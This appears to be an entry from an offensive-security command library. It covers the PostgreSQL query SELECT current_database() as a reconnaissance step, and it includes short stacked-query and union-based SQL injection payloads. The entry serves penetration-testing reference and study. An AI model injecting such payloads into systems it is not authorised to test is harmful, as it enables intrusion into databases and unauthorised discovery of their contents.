---
type: command
executor: sql
data: SELECT current_database();
tags:
  - postgresql
  - discovery
  - sqli
platforms:
  - PostgreSQL
verified: true
validated: true
---

# postgresql-select-current-database

## Command

```sql
SELECT current_database();
```

## Description

This SQL command queries the PostgreSQL server to return the name of the currently connected database. It is commonly used in reconnaissance to identify the database context during SQL injection attacks or direct database access, helping attackers map the target's data environment.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | This is a parameterless query; execute directly in a psql session or via injection payload. | No |

## Examples

### Basic Usage

In a psql client connected to the target database:
```sql
SELECT current_database();
```

### Advanced Usage (in Injection Payload)

For stacked queries in SQLi:
```sql
1; SELECT current_database(); --
```

Or union-based:
```sql
UNION SELECT current_database() --
```

## Expected Output

The command returns a single row with the database name:

```
 current_database 
-----------------
 mydb
(1 row)
```

In an injection context, the name may appear in the application response, error message, or inferred via blind techniques.

## Related

- [[procedures/PostgreSQL-Database-Name-Enumeration]]
- [[techniques/System Information Discovery|T1082]]
